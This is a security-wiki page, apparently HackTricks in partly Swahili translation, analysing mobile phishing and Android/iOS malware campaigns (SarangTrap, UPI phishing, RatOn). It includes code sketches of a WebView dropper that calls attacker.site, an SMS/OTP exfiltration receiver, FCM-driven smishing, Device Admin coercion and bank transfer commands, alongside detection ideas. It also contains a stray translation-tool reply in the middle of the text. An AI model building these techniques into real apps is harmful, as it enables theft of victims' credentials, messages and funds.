# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ukurasa huu unafunika mbinu zinazotumiwa na watendaji wa tishio kusambaza **malicious Android APKs** na **iOS mobile-configuration profiles** kupitia phishing (SEO, social engineering, maduka ya uongo, apps za dating, n.k.).
> Nyenzo imekitishwa kutoka kwenye kampeni ya SarangTrap iliyofichuliwa na Zimperium zLabs (2025) na utafiti mwingine wa umma.

## Mtiririko wa Shambulizi

1. **SEO/Phishing Infrastructure**
* Sajili domain nyingi zinazofanana (dating, cloud share, car service…).
– Tumia maneno muhimu ya lugha ya eneo na emojis katika `<title>` element ili kuonekana vizuri kwenye Google.
– Host *both* Android (`.apk`) and iOS install instructions on the same landing page.
2. **First Stage Download**
* Android: link moja kwa moja kwa *unsigned* au APK ya “third-party store”.
* iOS: `itms-services://` au link ya HTTPS ya profile hatari ya **mobileconfig** (angalia hapo chini).
3. **Post-install Social Engineering**
* Katika kuendesha kwa mara ya kwanza app inamuomba mtumiaji **invitation / verification code** (kuleta hisia ya ufikiaji wa kipekee).
* Code hiyo inatumwa kwa POST juu ya HTTP kwenda Command-and-Control (C2).
* C2 inajibu `{"success":true}` ➜ malware inaendelea.
* Sandbox / AV dynamic analysis ambayo haitumiwi kwa kutuma code halali haiona **no malicious behaviour** (evation).
4. **Runtime Permission Abuse** (Android)
* Permissions hatari zinaombwa tu **baada ya jibu chanya kutoka C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Varianti za karibuni **zinaondoa `<uses-permission>` ya SMS kutoka `AndroidManifest.xml`** lakini ziacha path ya Java/Kotlin ambayo inasoma SMS kupitia reflection ⇒ inapunguza score ya static huku ikibaki kufanya kazi kwenye vifaa ambavyo vinampa ruhusa kupitia `AppOps` abuse au malengo ya zamani.
5. **Facade UI & Background Collection**
* App inaonyesha views zisizo hatari (SMS viewer, gallery picker) zilizounganishwa ndani.
* Wakati huo huo huchukua na kutuma nje:
- IMEI / IMSI, nambari ya simu
- Dump kamili ya `ContactsContract` (JSON array)
- JPEG/PNG kutoka `/sdcard/DCIM` zilizoshinikizwa kwa kutumia [Luban](https://github.com/Curzibn/Luban) kupunguza ukubwa
- Yenye hiari SMS content (`content://sms`)
Payloads zinakandamizwa kwa batch-zip na kutumwa kupitia `HTTP POST /upload.php`.
6. **iOS Delivery Technique**
* Profile moja ya **mobile-configuration** inaweza kuomba `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` n.k. kujiandikisha kifaa katika udhibiti unaofanana na “MDM”.
* Maelekezo ya social-engineering:
1. Fungua Settings ➜ *Profile downloaded*.
2. Gusa *Install* mara tatu (screenshot kwenye ukurasa wa phishing).
3. Trust the unsigned profile ➜ mshambuliaji anapata ruhusa za *Contacts* & *Photo* bila kupitia App Store review.
7. **Network Layer**
* Plain HTTP, mara nyingi kwa port 80 na HOST header kama `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (hakuna TLS → rahisi kugundua).

## Defensive Testing / Red-Team Tips

* **Dynamic Analysis Bypass** – Wakati wa tathmini ya malware, automate hatua ya invitation code kwa kutumia Frida/Objection ili kufikia tawi hatari.
* **Manifest vs. Runtime Diff** – Linganisha `aapt dump permissions` na runtime `PackageManager#getRequestedPermissions()`; permissions hatari zisizopatikana ni alama ya hatari.
* **Network Canary** – Sanidi `iptables -p tcp --dport 80 -j NFQUEUE` kugundua mfululizo wa POST zisizo za kawaida baada ya kuingiza code.
* **mobileconfig Inspection** – Tumia `security cms -D -i profile.mobileconfig` kwenye macOS ili kuorodhesha `PayloadContent` na kutambua ruhusa nyingi kupita kiasi.

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics** kugundua mlipuko wa ghafla wa domain zilizojazwa maneno muhimu.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` kutoka kwa Dalvik clients nje ya Google Play.
* **Invite-code Telemetry** – POST ya nambari za tarakimu 6–8 karibu mara baada ya apk kutumika inaweza kuashiria staging.
* **MobileConfig Signing** – Kata profiles zilizotiwa sahihi bila saini kupitia sera za MDM.

## Useful Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Viashiria (Za jumla)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

This pattern imeonekana kwenye kampeni zinazotumia mandhari ya faida za serikali kuiba(credentials) za Indian UPI na OTPs. Waendeshaji wanachanganya majukwaa yenye sifa kwa ajili ya delivery na resilience.

### Delivery chain across trusted platforms
- YouTube video lure → description ina short link
- Shortlink → GitHub Pages phishing site inayofanana na legit portal
- Same GitHub repo inahifadhi APK yenye fake “Google Play” badge ikielekeza moja kwa moja kwenye file
- Dynamic phishing pages zipo kwenye Replit; remote command channel inatumia Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- APK ya kwanza ni installer (dropper) inayosafirisha malware halisi katika `assets/app.apk` na inamtia mtumiaji moyo kuzima Wi‑Fi/mobile data ili kupunguza cloud detection.
- The embedded payload inasakinishwa chini ya label isiyoonekana (mfano, “Secure Update”). Baada ya usakinishaji, installer na payload zote zipo kama apps tofauti.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Ugundaji wa endpoints unaobadilika kupitia shortlink
- Malware inapata orodha ya plain-text, iliyotengwa kwa koma ya endpoints hai kutoka kwa shortlink; mabadiliko rahisi ya string hutoa path ya mwisho ya ukurasa wa phishing.

Mfano (imerekebishwa):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudokodi:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Kuvuna credentials za UPI kwa kutumia WebView
- Hatua ya “Make payment of ₹1 / UPI‑Lite” hupakia fomu ya HTML ya mshambuliaji kutoka kwenye endpoint ya dinamik ndani ya WebView na inakamata mawanja nyeti (namba ya simu, benki, UPI PIN) ambazo zimetumwa kwa `POST` kwenye `addup.php`.

Loader mdogo:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Ujisambazaji na kunasa SMS/OTP
- Ruhusa kali zinaombwa mara ya kwanza programu inapoanzishwa:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Mawasiliano hurudiwa ili kutuma kwa wingi smishing SMS kutoka kwa kifaa cha mwathiriwa.
- SMS zinazoingia zinakamatwa na broadcast receiver na hupakiwa pamoja na metadata (sender, body, SIM slot, per-device random ID) kwenda `/addsm.php`.

Mchoro wa receiver:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) kama C2 thabiti
- Payload inajiandikisha kwa FCM; jumbe za push zina uwanja `_type` unaotumika kama kibadili kuanzisha vitendo (mfano, kusasisha templates za phishing, kubadili tabia).

Example FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler rasimu:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Hunting patterns and IOCs
- APK ina payload ya sekondari katika `assets/app.apk`
- WebView inaleta malipo kutoka `gate.htm` na hutuma nje kwa `/addup.php`
- Utoaji nje wa SMS kwa `/addsm.php`
- Uchukuaji wa config unaoendeshwa na shortlink (mf., `rebrand.ly/*`) kurudisha endpoints za CSV
- Apps zenye lebo ya jumla “Update/Secure Update”
- Ujumbe za FCM `data` zenye discriminator `_type` katika apps zisizo za kuaminika

### Mawazo ya ugundaji na ulinzi
- Alama apps zinazowaelekeza watumiaji kuzima mtandao wakati wa ufungaji na kisha side-load APK ya pili kutoka `assets/`.
- Angaza kuhusu tuple ya ruhusa: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + mifereji ya malipo ya WebView.
- Ufuatiliaji wa egress kwa `POST /addup.php|/addsm.php` kwenye hosts zisizo za kibiashara; zuia infrastructure inayojulikana.
- Kanuni za Mobile EDR: apps zisizo za kuaminika zinazojisajili kwa FCM na kubranchi kulingana na uwanja `_type`.

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Wavamizi wanazidi kubadilisha viungo vya APK vya static na channel ya Socket.IO/WebSocket iliyowekwa ndani ya matangazo yanayoonekana kama Google Play. Hii inaficha URL ya payload, inaepuka vichujio vya URL/extension, na inahifadhi UX ya ufungaji yenye mwonekano wa kweli.

Mtiririko wa kawaida wa mteja ulioonekana katika mazingira halisi:
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
Kwa nini inajiepusha na udhibiti rahisi:
- Hakuna URL ya APK ya statiki inayoonyeshwa; payload inaundwa tena katika kumbukumbu kutoka kwa WebSocket frames.
- Vichujio vya URL/MIME/extension vinavyofunga majibu ya moja kwa moja ya .apk vinaweza kukosa data za binary zilizofunikwa kupitia WebSockets/Socket.IO.
- Crawlers na URL sandboxes ambazo hazitekelezi WebSockets hazitapata payload.

Mbinu za uwindaji na utambuzi:
- Web/network telemetry: weka alama vikao vya WebSocket vinavyopelekesha vipande vikubwa vya binary ikifuatiwa na uundaji wa Blob yenye MIME application/vnd.android.package-archive na click ya programmatiki `<a download>`. Angalia client strings kama socket.emit('startDownload'), na matukio yenye majina chunk, downloadProgress, downloadComplete katika page scripts.
- Play-store spoof heuristics: kwenye domains ambazo si Google zinazotoa kurasa zinazofanana na Play, tafuta Google Play UI strings kama http.html:"VfPpkd-jY41G-V67aGc", templates zenye mchanganyiko wa lugha, na mtiririko bandia wa “verification/progress” unaosukumwa na matukio ya WS.
- Controls: zuia utoaji wa APK kutoka kwa asili zisizo za Google; imweke sera za MIME/extension zinazoashiria trafiki ya WebSocket; hifadhi maonyo ya upakuaji salama ya browser.

Angalia pia mbinu na zana za WebSocket:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn somo la kesi

Kampeni ya RatOn banker/RAT (ThreatFabric) ni mfano wazi wa jinsi operesheni za kisasa za mobile phishing zinavyochanganya WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, na hata NFC-relay orchestration. Sehemu hii inatoa muhtasari wa mbinu zinazoweza kutumika tena.

### Stage-1: WebView → native install bridge (dropper)
Washambuliaji huonesha WebView inayolenga ukurasa wa mshambuliaji na kuingiza JavaScript interface inayofungua native installer. Kubofya kitufe cha HTML huita native code ambayo inasakinisha APK ya hatua ya pili iliyowekwa katika assets za dropper na kisha kuizindua moja kwa moja.

Mfano wa msingi:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
Hakuna HTML/maudhui yaliyotolewa. Tafadhali bandika yaliyomo ya ukurasa (HTML/Markdown) hapa ili niweze kutafsiri kwa Kiswahili. Nitahifadhi tags, links, paths, code na maneno maalum bila kutafsiri.
```html
<button onclick="bridge.installApk()">Install</button>
```
Baada ya kusakinishwa, dropper huanzisha payload kupitia explicit package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Wazo la upelelezi: apps zisizotegemewa zinapiga simu `addJavascriptInterface()` na kufichua njia zinazofanana na installer kwa WebView; APK inasafirisha payload sekondari iliyowekwa chini ya `assets/` na kuita Package Installer Session API.

### Mchakato wa ridhaa: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 hufungua WebView inayoshikilia ukurasa wa “Access”. Kitufe chake kinafanya call kwa exported method inayompeleka mwathiriwa kwenye mipangilio ya Accessibility na kuomba kuamilisha huduma haribifu. Mara inapopokelewa, malware inatumia Accessibility kubofya kwa njia ya kiotomatiki kupitia dialog za ruhusa za runtime zinazofuata (contacts, overlay, manage system settings, n.k.) na kuomba Device Admin.

- Accessibility kwa njia ya programu husaidia kukubali ombi za baadaye kwa kutafuta vitufe kama “Allow”/“OK” katika node-tree na kutekeleza clicks.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Angalia pia:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom kupitia WebView
Watendaji wanaweza kutoa amri za:
- kuonyesha overlay ya skrini nzima kutoka kwa URL, au
- kupitisha HTML ya inline ambayo inapakiwa ndani ya overlay ya WebView.

Matumizi inayowezekana: shinikizo (kuingiza PIN), kufungua mkoba ili kunasa PINs, ujumbe wa ransom. Weka amri kuhakikisha ruhusa ya overlay imetolewa ikiwa haipo.

### Mfano wa udhibiti wa mbali – skrini bandia ya maandishi + screen-cast
- Bandwidth ya chini: mara kwa mara toa mti wa Accessibility nodes, serialize maandishi/roles/bounds yanayoonekana na uyatume kwa C2 kama skrini bandia (amri kama `txt_screen` mara moja na `screen_live` mfululizo).
- Ubora wa juu: omba MediaProjection na anza screen-casting/recording kwa mahitaji (amri kama `display` / `record`).

### ATS playbook (bank app automation)
Kutokana na kazi ya JSON, fungua app ya benki, endesha UI kupitia Accessibility kwa mchanganyiko wa maswali ya maandishi na taps za kuratibu, na ingiza PIN ya malipo ya mwathiriwa wakati utaombwa.

Mfano wa kazi:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Mifano ya maandishi yaliyoonekana katika mtiririko mmoja wa lengo (CZ → EN):
- "Nová platba" → "Malipo mapya"
- "Zadat platbu" → "Ingiza malipo"
- "Nový příjemce" → "Mpokeaji mpya"
- "Domácí číslo účtu" → "Nambari ya akaunti ya ndani"
- "Další" → "Ijayo"
- "Odeslat" → "Tuma"
- "Ano, pokračovat" → "Ndiyo, endelea"
- "Zaplatit" → "Lipa"
- "Hotovo" → "Imekamilika"

Waendeshaji pia wanaweza kuangalia/kuongeza mipaka ya uhamisho kwa kutumia amri kama `check_limit` na `limit` ambazo zinaelekeza kwenye UI ya mipaka kwa njia ile ile.

### Crypto wallet seed extraction
Malengo kama MetaMask, Trust Wallet, Blockchain.com, Phantom. Mtiririko: fungua (PIN iliyoporwa au nywila iliyotolewa), enda kwenye Security/Recovery, funua/onyesha seed phrase, keylog/exfiltrate. Tekeleza locale-aware selectors (EN/RU/CZ/SK) ili kuimarisha urambazaji kwa lugha mbalimbali.

### Device Admin coercion
Device Admin APIs zinatumiwa kuongeza fursa za kunasa PIN na kumfadhaisha mlengwa:

- Kufunga mara moja:
```java
dpm.lockNow();
```
- Sababisha credential ya sasa kuisha ili kulazimisha mabadiliko (Accessibility inakamata PIN/nenosiri mpya):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Lazimisha kufungua bila biometric kwa kuzima vipengele vya keyguard biometric:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Kumbuka: Taarifa nyingi za DevicePolicyManager zinahitaji Device Owner/Profile Owner kwenye Android za hivi punde; baadhi ya ujenzi wa OEM yanaweza kuwa wavivu. Daima thibitisha kwenye OS/OEM lengwa.

### Kuendesha NFC relay (NFSkate)
Stage-3 inaweza kusanidisha na kuanzisha moduli ya nje ya NFC-relay (kwa mfano, NFSkate) na hata kumpa template ya HTML kumwongoza muathiriwa wakati wa relay. Hii inawawezesha contactless card-present cash-out pamoja na online ATS.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Seti ya amri za operator (mfano)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Mawazo ya utambuzi na ulinzi (RatOn-style)
- Tafuta WebViews zenye `addJavascriptInterface()` zinazofichua njia za installer/permission; kurasa zinazomalizika kwa “/access” zinazochochea prompti za Accessibility.
- Toa tahadhari kwa apps zinazozalisha ishara/bonyeza za Accessibility kwa kiwango kikubwa hivi karibuni baada ya kupewa ufikiaji wa huduma; telemetry inayofanana na Accessibility node dumps inayotumwa kwa C2.
- Simamia mabadiliko ya sera za Device Admin katika apps zisizotegemewa: `lockNow`, password expiration, toggles za vipengele vya keyguard.
- Toa tahadhari kwa prompti za MediaProjection kutoka apps zisizo za kibiashara zikifuatiwa na upakiaji wa fremu kwa vipindi.
- Gundua usakinishaji/kuanzishwa kwa app ya nje ya NFC-relay iliyochochewa na app nyingine.
- Kwa benki: lekeza out-of-band confirmations, biometrics-binding, na transaction-limits zisizo rahisi kwa automation inayofanywa kwenye kifaa.

## References

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
